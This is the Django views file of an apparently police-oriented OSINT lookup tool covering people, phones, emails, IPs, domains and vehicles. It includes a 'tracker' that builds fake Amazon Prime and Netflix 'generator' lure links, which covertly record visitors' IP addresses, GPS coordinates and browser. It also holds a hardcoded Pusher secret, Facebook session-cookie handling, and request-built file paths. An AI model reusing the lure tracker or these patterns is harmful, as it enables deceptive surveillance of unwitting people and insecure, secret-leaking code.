from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt
from django.contrib.sessions.models import Session
from django.core.exceptions import PermissionDenied
from django.contrib import messages
from django.contrib.auth import update_session_auth_hash
from django.contrib.auth.models import User, auth
from django.contrib.auth.forms import PasswordChangeForm
from django.template.loader import get_template, render_to_string
from django.http import JsonResponse, HttpResponse, HttpResponseRedirect

from .modules.filehandlers import ReadCentralData, ReadCentralQueries, HistoryData, endtimeupdate,cases
from .modules.social.social import Social,common_social
from .modules.email.email import Email
from .modules.ip.ip import Ipaddress
from .modules.ip.portscan import DefaultPort
from .modules.phone.phone import Phone
from .modules.domain.webosint import getDomain
from .modules.ip.maclookup import macLookup
from .modules.image.metadata import Metadata
from .modules.analysis.facedetection import FaceDetection
from .modules.analysis.fakedetection import SupeciousDetection

from .modules.image.reverseimg import reverseImg
from .modules.ip.multipleip import read_multiple_ip
from .modules.ip.ipstack import IPtrace
from .modules.social.locmap import loc, heat_map, gps_map

from .modules.btc.btc import btcaddress
from .modules.cluster import MakeCluster
from .modules.social.fbkeyword import FacebookScrapper
from .modules.vechile.license import vechileno
from .modules.name.name import Namedetails
from .modules.searchengine.search import searchscrape

from weasyprint import HTML
import sys, os, requests, re, time,base64, json
import pdfx, pdfkit, urllib.parse, urllib3, tempfile
from io import BufferedReader, BytesIO
from datetime import datetime, timezone
from xhtml2pdf import pisa
from pyvirtualdisplay import Display

from dateutil import tz
import json

from pusher import Pusher

pusher = Pusher(app_id=u'1046760', key=u'f4df5a848663a330b6fe', secret=u'8ade16bd58271d3e2e0c', cluster=u'ap2')

sys.path.append("../src")
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

@csrf_exempt
def index(request):
	if request.method == 'GET':

		username = request.user.username
		user = User.objects.filter(username=username).first()

		'''try:
			history = HistoryData("media/json/history_{}.json".format(username),"r")
		except FileNotFoundError:
			history = HistoryData("media/json/history_{}.json".format(username),"w",open("templates/json/history.json").read())
		'''
		history=HistoryData("media/json/history.json","r")
		activity={}
		for keys,values in history['activity'].items():
			activity[keys]={}
			activity[keys]['casename']=values['casename']
			activity[keys]["query"]=values['query'][:1]

		return render(request, 'index.html', {'search_query':activity,'cases':history['cases']})

	if request.method == 'POST':
		username = request.user.username
		user = User.objects.filter(username=username).first()

		ipstackkey = user.profile.ipstackkey
		macapikey = user.profile.macapikey
		apilayerphone = user.profile.apilayerphone
		hlruname = user.profile.hlruname
		hlrpwd = user.profile.hlrpwd
		hibpkey = user.profile.hibpkey
		hunterkey = user.profile.hunterkey
		googlemapapikey = user.profile.googlemapapikey
		shodankey = user.profile.shodankey
		emailrepkey = user.profile.emailrepkey
		c_user = user.profile.c_user
		xs = user.profile.xs
		
		try:
			history = HistoryData("media/json/history_{}.json".format(username),"r") #Reading the history file
		except FileNotFoundError:
			history = HistoryData("media/json/history_{}.json".format(username),"w",open("templates/json/history.json").read()) #Creating the history file if not exist

		if "clear" in request.POST.keys(): # Clearning the My Acitvity from homescreen
			history["activity"]=[]
			history = HistoryData("media/json/history_{}.json".format(username),"w",json.dumps(history, indent = 4))
			return HttpResponse(status=204)

		queries = request.POST['query'].split(",")[:-1]
		request.POST._mutable=True

		starttime = datetime.now().astimezone(tz.gettz('ITC')).strftime('%d %B, %Y %H:%M') # Scan start time
		try:
			case={"casename":request.POST.get("casename"),"caseno":request.POST.get("caseno"),"casedescription":request.POST.get("casedescription")}
			user.profile.case=case['caseno']
			user.save()
		except:
			case=request.POST.get("caseno")
		
		results={}

		if request.POST.get('name')!="":
			if request.POST.get('tag')!="":
				data=str(request.POST['name']+" "+request.POST['tag'])
			else:
				data=str(request.POST['name'])

			if data in ReadCentralQueries("name").keys():
				endtimeupdate(request)
			else:
				namedata={}
				namedata['search'] = searchscrape(data) #linkes docs username alises

				request.POST['username']=namedata['search']['common_username'] 			
				namedata['common_social']=common_social(namedata['search']['social'])# fb insta twitter linkedin
				
				namedata['basicdetails'] = Namedetails(request.POST['name']) #gender,country,Timesofindia Articles
				newrequest=request
				newrequest.mutable=True
				newrequest.POST['query']="name:"+request.POST['name']
				#ReadCentralData(newrequest,"w",namedata)
				results['name']=namedata
		
		if request.POST.get("username") != '':
			if request.POST['username'] in ReadCentralQueries("social").keys():
				endtimeupdate(request)
			else:
				myactivity = [case,user.first_name,"social",request.POST.get('username'),starttime]
				cases(myactivity)
				social = Social(request, "social", request.POST['username'])

				newrequest=request
				newrequest.mutable=True
				newrequest.POST['query']="social:"+request.POST['username']
				results['social']=social
				#ReadCentralData(request,"w",social)

		if request.POST.get("phone") != '':
			if request.POST['phone'] in ReadCentralQueries("phone").keys():
				endtimeupdate(request)
			else:
				myactivity = [case,user.first_name,"name",request.POST.get('phone'),starttime]
				cases(myactivity)
				phone = Phone(request.POST['phone'], apilayerphone, hlruname, hlrpwd)
				if "email" in phone['truecaller'].keys():
					request.POST['email']=phone['truecaller']['email']
				if "domain" in phone['truecaller'].keys():
					request.POST['query']+="domain:"+phone['truecaller']['domain']+","
				
				results['phone']=phone
				newrequest=request
				newrequest.mutable=True
				newrequest.POST['query']="phone:"+request.POST['phone']

				#ReadCentralData(request,"w",phone)

		if request.POST.get("email") != '':
			if request.POST['email'] in ReadCentralQueries("email").keys():
				endtimeupdate(request)
			else:
				myactivity = [case,user.first_name,"name",request.POST.get('email'),starttime]
				cases(myactivity)				

				email = Email(request.POST['email'], hibpkey, hunterkey, emailrepkey)

				newrequest=request
				newrequest.mutable=True
				newrequest.POST['query']="email:"+request.POST['email']

				results['email']=email
				#ReadCentralData(request,"w",email)

		for query in queries:
			query = str(query.replace(" ", ""))
			query = query.split(":", 1)

			request_type = str(query[0])
			request_data = str(query[1])

			starttime = datetime.now().astimezone(tz.gettz('ITC')).strftime('%d %B, %Y %H:%M') # Scan start time
			try:
				case={"casename":request.POST.get("casename"),"caseno":request.POST.get("caseno"),"casedescription":request.POST.get("casedescription")}
				user.profile.case=case['caseno']
				user.save()
			except:
				case=request.POST.get("caseno")

			myactivity = [case,user.first_name,request_type,request_data,starttime]

			for i in history["notifications"]:
				if i["Type"] == request_type and i['Data'] == request_data and i['Status'] == 1:
					return JsonResponse({"Message":"Scan is processing. Please check Reports"})
			
			if "ajax" in request.POST.keys():
				history["query_type"][request_type]+=1 # Increasing the scanned query count
				notify={
					"Type": "{}".format(request_type),
					"Data": "{}".format(request_data),
					"Status": 1,
					"created": "{}".format(starttime),
					"completed": ""
				}
				history["notifications"].insert(0,notify)
				#history["activity"].insert(0,{"query":myactivity})
				cases(myactivity)
				history = HistoryData("media/json/history_{}.json".format(username),"w",json.dumps(history, indent = 4)) # Writing the notifcation and query count, search type and query to json

			data=ReadCentralQueries(request_type) # Opening the centralized json that stores all the query result

			if request_type == 'ip':
				if request_data in data[request_type].keys():
					endtimeupdate(request)
				else:
					if ipstackkey and shodankey and googlemapapikey != "":
						ip = Ipaddress(request_data, ipstackkey, shodankey)
						#ReadCentralData(request,"w",ip)	
						results['ip']=ip
					else:
						return render(request, 'index.html', {'Error':'IPstack / Shodan / GoogleMaps API key missing'})

			elif request_type == 'victimtrack':
					
					request_data = request_data.split(',')
					pubip = request_data[0]

					ip = {}

					if googlemapapikey=="" or ipstackkey == "":
						return render(request, 'index.html', {'Error': 'Googlemap / IPstack API key missing'})

					if request_data[1].replace('.', '', 1).isdigit() and request_data[2].replace('.', '',1).isdigit():
						lat = float(request_data[1])
						lon = float(request_data[2])
						ip['gpsmap'] = True #gps_map([lat], [lon], googlemapapikey)  # GPS Latitude and Longitude

					ip = IPtrace(pubip, ipstackkey)
					iplats = ip['ipstackdata']['latitude'] # IP latitude and Longitudes
					iplons = ip['ipstackdata']['longitude']

					ip['ipstackdata']['latitude'] = request_data[1]
					ip['ipstackdata']['longitude'] = request_data[2]
					return render(request, 'viewreports/ip.html', {'ip': ip, 'iplats': iplats, 'iplons': iplons,"api":googlemapapikey,"gmap3":True})

			elif request_type == 'mac':
				if request_data in data[request_type].keys():
					endtimeupdate(request)
				else:
					if macapikey == "":
						return render(request, 'index.html', {'Error': 'Missing Ip MacVender API Key'})
			
					macdata = macLookup(request_data, macapikey)
					#ReadCentralData(request,"w",macdata)
					results['mac']=macdata

			elif request_type == 'domain':
				domain(request, request_type, request_data)

			elif request_type == 'btc':
				if request_data in data[request_type].keys():
					endtimeupdate(request)
				else:
					btc = btcaddress(request_data)
					#ReadCentralData(request,"w",btc)
					results['btc']=btc

			elif request_type == 'vehicle':
				if request_data in data[request_type].keys():
					endtimeupdate(request)
				else:
					vechileinfo = vechileno(request_data)
					#ReadCentralData(request,"w",vechileinfo)
					results['vechile']=vechileinfo
		print(results)
		resultsdata=json.loads(open("media/json/case/"+request.POST.get("caseno")+".json","r").read())
		resultsdata['results']=results
		file=open("media/json/case/"+request.POST.get("caseno")+".json","w")
		file.write(json.dumps(resultsdata,indent=4))
		file.close()
			
		pusher.trigger(username, 'my-event', {'query': request.POST.get("caseno"), 'endtime':datetime.now().astimezone(tz.gettz('ITC')).strftime('%d %B, %Y %H:%M')})
		return HttpResponse(status=204)

def viewreport(request):

	if request.method == 'GET':
		username = request.user.username
		try:
				history = HistoryData("media/json/history_{}.json".format(username),"r")
		except FileNotFoundError:
			history = HistoryData("media/json/history_{}.json".format(username),"w",open("templates/json/history.json").read())

		return render(request, "reports.html", {"search_query": json.dumps(history['notifications'])})

	if request.method == 'POST':
		return ReadCentralData(request)

def deletereport(reqeust):
	if request.method == 'POST':
		rowindex = int(reqeust.POST.get('rowindex'))

		history = HistoryData("media/json/history_{}.json".format(username),"r")

		del history['notifications'][rowindex]

		HistoryData("media/json/history_{}.json".format(username),"w",json.dumps(history, indent = 4))

		return HttpResponse(status=204)


def domain(request, request_type, request_data):
	username = request.user.username
	searchfile = open("media/json/data/domain.json","r") # Opening the centralized json that stores all the query result
	data=json.loads(searchfile.read())
	searchfile.close()

	request_type = "domain"
	if request_data in data[request_type].keys():
			webosint = data[request_type][request_data]["webosint"]
			portscan = data[request_type][request_data]["portscan"]
			endtimeupdate(request)
	else:
			portscan = DefaultPort(request_data)
			webosint = getDomain(request_data)
			#ReadCentralData(request,"w",{"webosint": webosint, 'portscan': portscan})

	resultsdata=json.loads(open("media/json/case/"+request.POST.get("caseno")+".json","r").read())
	resultsdata['results']={"webosint": webosint, 'portscan': portscan}
	file=open("media/json/case"+request.POST.get("caseno")+".json","w")
	file.write(json.dumps(resultsdata,indent=4))
	file.close()
	
	pusher.trigger(username, 'my-event', {'query': request_data, 'endtime':datetime.now().astimezone(tz.gettz('ITC')).strftime('%d %B, %Y %H:%M')})
	return HttpResponse(status=204)

def cluster(request):
	if request.method == "POST":
		request_data = request.POST['query']
		jsonurl = MakeCluster(request, request_data.split(","))
		return render(request, '3dcluster.html', {'url': jsonurl})
	return render(request,"3dcluster.html")

def reverseimage(request):

	if request.method == "POST":

		url = reverseImg(str(request.FILES['input-b2']), request.FILES['input-b2'].file)
		if "https" in url:
				return redirect(url)
		else:
				return render(request, 'apps/apps.html', {"Error": url})


def metadata(request):

	if request.method == "POST":

		return Metadata(request)

def heatmap(request):
	username = request.user.username
	user = User.objects.filter(username=username).first()
	if request.method == "POST":
		if 'input-b1' in request.FILES.keys() and request.FILES['input-b1'] != "":
				ipstackkey = user.profile.ipstackkey
				gmap3 = read_multiple_ip(request.FILES['input-b1'].file, ipstackkey)
				return render(request, 'viewreports/results.html', {'gmap3': gmap3})
		else:
				return render(request, "apps/apps.html")

def apps(request):
	return render(request, "apps/apps.html")

def trackactivity(request):
	return render(request,"trackactivity.html")

def documentation(request):
	if request.method == "GET":
			try:
					page = request.GET['page']
					if page == "start":
							return render(request, 'doc/start.html')
					elif page == "elements":
							return render(request, 'doc/elements.html')
					elif page == "license":
							return render(request, 'doc/license.html')
					elif page == "tracker":
							return render(request, 'doc/trackerinfo.html')
					elif page == "faq":
							return render(request, 'doc/faq.html')
					elif page == "credits":
							return render(request, 'doc/credits.html')
					else:
							pass
			except:
					pass
	return render(request, 'doc/documentation.html')


def settings(request):

	if request.method == 'GET':

		return render(request, 'settings.html')

	if request.method == 'POST':

		username = request.user.username
		user = User.objects.filter(username=username).first()

		if "exportjson" in request.POST.keys():
			attr = list(request.POST.keys())
			jsonexport = "{"

			for keys in attr[5:]:
					jsonexport += "\"" + keys + "\"" + ":" + "\"" + request.POST[keys].encode().decode('utf-8') + "\"" + ","
			jsonexport += "}"
			filename = str(user) + '_exportkeys.json'
			response = HttpResponse(jsonexport, content_type='application/json')
			response['Content-Length'] = len(response.content)
			response['Content-Disposition'] = 'attachment; filename=' + str(filename)
			return response

		elif "importjson" in request.FILES.keys():

			file = str(request.FILES['importjson']).split(".")
			if len(file) == 2 and file[-1] == "json":

				with BufferedReader(request.FILES['importjson']) as f:
					jsoncontent = f.read().decode("utf-8").replace(",}", "}")
				jsoncontent = json.loads(jsoncontent)

				for keys in jsoncontent.keys():

					attr = list(request.POST.keys())
					if keys not in attr[3:]:
						return render(request, 'settings.html', {"Error": "File with Unknown Key"})

				for keys in attr[3:]:
					user.profile.keys = jsoncontent[keys]

				user.profile.save()
				return render(request, 'settings.html')
			else:
					return render(request, 'settings.html', {"Error": "Unknown File format"})

		if request.POST['hibpkey'] != '':
			user.profile.hibpkey = request.POST['hibpkey']

		if request.POST['hunterkey']!= '':
			user.profile.hunterkey = request.POST['hunterkey']

		if request.POST['apilayerphone'] != '':
			user.profile.apilayerphone = request.POST['apilayerphone']

		if request.POST['hlruname'] != '':
			user.profile.hlruname = request.POST['hlruname']

		if request.POST['hlrpwd'] != '':
				user.profile.hlrpwd = request.POST['hlrpwd']

		if request.POST['googlemapapikey'] != '':
			user.profile.googlemapapikey = request.POST['googlemapapikey']

		if request.POST['macapikey'] != '':
			user.profile.macapikey = request.POST['macapikey']

		if request.POST['ipstackkey'] != '':
			user.profile.ipstackkey = request.POST['ipstackkey']

		if request.POST['virustotalkey'] != '':
			user.profile.virustotalkey = request.POST['virustotalkey']

		if request.POST['shodankey'] != '':
			user.profile.shodankey = request.POST['shodankey']

		if request.POST['emailrepkey'] != '':
			user.profile.emailrepkey = request.POST['emailrepkey']

		if request.POST['c_user'] != '':
			user.profile.c_user = request.POST['c_user']

		if request.POST['xs'] != '':
			user.profile.xs = request.POST['xs']

		user.profile.save()
		return render(request, 'settings.html')


@csrf_exempt
def receivetrack(request, template, username):
	secret = str(str(request.META['PATH_INFO']).split('/')[-1]).replace('a', '=')
	secret = base64.b64decode(secret)
	secret = secret.decode('ascii')
	secret = "".join(
			["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c) + 23) % 36] for c in
				secret])

	if request.method == 'GET':
			return render(request, request.META['PATH_INFO'].split('/')[1] + '.html')

	elif request.method == 'POST':
			localip = str(request.POST.get('locip'))
			viclatitude = str(request.POST.get('latitude'))
			viclongitude = str(request.POST.get('longitude'))

			vicuseragent = str(request.user_agent.browser.family)

			publicip = str(request.META.get('HTTP_X_REAL_IP'))

			user = User.objects.filter(username=secret).first()

			if user.profile.victimpublicip == '':  # Assigning values for the first time
					user.profile.victimpublicip = publicip
					user.profile.victimlocip = localip
					user.profile.victimlatitude = viclatitude
					user.profile.victimlongitude = viclongitude
					user.profile.victimuseragent = vicuseragent

			user.profile.victimpublicip += ',' + publicip  # Appending values from 2nd time
			user.profile.victimlocip += ',' + localip
			user.profile.victimlatitude += ',' + viclatitude
			user.profile.victimlongitude += ',' + viclongitude
			user.profile.victimuseragent += ',' + vicuseragent

			user.profile.save()
			return render(request, request.META['PATH_INFO'].split('/')[1] + '.html')


def tracker(request):
	if request.method == 'GET':

		username = request.user.username
		user = User.objects.filter(username=username).first()

		secret = "".join(
				["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c) + 13) % 36] for c in
					str(username)])
		secret = base64.b64encode(str(secret).encode('ascii'))
		if "=" in str(secret.decode('ascii')):
			secret = str(secret.decode('ascii')).replace('=', 'a')
		try:
			secret = secret.decode('ascii')
		except:
			pass
		url = {}

		url['1'] = "https://osint.studio/amazonprimegenerator/" + str(secret)

		url['2'] = "https://osint.studio/netflixaccountgenerator/" + str(secret)

		# Fetching values from DB as list

		victimpublicip = user.profile.victimpublicip.split(",")

		victimlocip = user.profile.victimlocip.split(",")

		viclatitude = user.profile.victimlatitude.split(",")

		viclongitude = user.profile.victimlongitude.split(",")

		vicuseragent = user.profile.victimuseragent.split(",")

		victim = []
		for i in range(len(viclatitude)):
			victim.append([victimpublicip[i], victimlocip[i], vicuseragent[i], viclatitude[i], viclongitude[i]])

		if victimpublicip != ['']:
			return render(request, 'apps/tracker.html', {'victim': victim, 'url': url})
		else:
			return render(request, 'apps/tracker.html', {'url': url})

	if request.method == 'POST':
		username = request.user.username
		user = User.objects.filter(username=username).first()
		if "flush" in request.POST.keys():
			user.profile.victimlatitude = ""
			user.profile.victimlocip = ""
			user.profile.victimpublicip = ""
			user.profile.victimlongitude = ""
			user.profile.victimuseragent = ""
			user.save()
			return redirect("apps/tracker")
		else:
			return redirect('apps/tracker')

def FaceDetector(request):
	return FaceDetection(request.POST.get("imgurl"))

def SupeciousDetector(request):
	return SupeciousDetection()

def change_password(request):
	if request.method == 'POST':
			form = PasswordChangeForm(request.user, request.POST)
			if form.is_valid():
				user = form.save()
				update_session_auth_hash(request, user)  # Important!
				success = {'success':'Password changed successfully'}
				return render(request, 'change_password.html', {'success': success['success']})
			else:
				messages.error(request, 'Please correct the error below.')
	else:
		form = PasswordChangeForm(request.user)
	return render(request, 'change_password.html', {'form': form})


def logout(request):
	auth.logout(request)
	return HttpResponseRedirect("login")


def login(request):
	if request.method == 'GET':
		return render(request, 'login.html')

	if request.method == 'POST':

		text = request.POST['policeid']

		password = request.POST['password']

		user = auth.authenticate(username=text, password=password)

		if user is not None:
			auth.login(request, user)
			return redirect('index')
		else:
			return render(request, 'login.html', {'Auth': 'False'})


def media(request, username):
	# print(request.COOKIES['sessionid'])
	session = Session.objects.get(session_key=request.COOKIES['sessionid'])
	uid = session.get_decoded().get('_auth_user_id')
	user = User.objects.get(pk=uid)
	if user.username == re.findall("/media/json/(.*).json", request.META['PATH_INFO'])[0]:
		with open("media/json/{}.json".format(user.username)) as data:
			jsondata = json.load(data)
			# print(jsondata)
			data.close()
			return JsonResponse(jsondata, safe=False)
	else:
		return forbidden(request, PermissionDenied())


def bad_request_error(request, exception):
	return render(request, 'Error400.html', status=400)


def forbidden(request, exception):
	return render(request, 'Error403.html', status=403)


def page_not_found(request, exception):
	return render(request, 'Error404.html', status=404)


def server_error(request):
	return render(request, 'Error500.html', status=500)

def viewcases(request):
	if request.method == "GET":
		file = open("media/json/history.json","r")
		casedata = json.loads(file.read())
		data=[]
		for case in casedata['cases']:
			cdata = json.loads(open("media/json/case/"+case+".json","r").read())
			data.append({"caseno":cdata['no'],"casename":cdata['name'],"caseteam":cdata['team']})
		
		return render(request, 'cases.html',{"casedata":data})
	else:
		caseno=request.POST.get("caseno")
		casedata=json.loads(open("media/json/case/"+caseno+".json","r").read())
		#return render(request, 'casedetails.html',{"casedata":casedata['activity'],"caseno":caseno})


		return render(request,"casereport.html",{"totalquery":casedata})
